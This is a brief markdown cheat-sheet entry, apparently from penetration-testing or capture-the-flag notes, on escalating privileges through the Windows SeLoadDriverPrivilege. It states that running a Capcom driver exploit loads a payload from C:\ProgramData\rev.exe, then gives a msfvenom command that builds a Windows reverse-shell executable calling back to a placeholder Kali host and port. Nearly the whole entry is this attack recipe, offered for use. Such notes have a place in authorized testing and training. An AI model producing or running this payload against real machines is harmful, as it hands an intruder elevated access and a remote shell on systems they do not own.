# SeLoadDriverPrivilege

Executing `.\ExpoitCapcom.exe` will load the Binary `C:\ProgramData\rev.exe`, so you can send yourself a revshell with mfsvenom
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<KALI_PORT> -f exe -o rev.exe
```
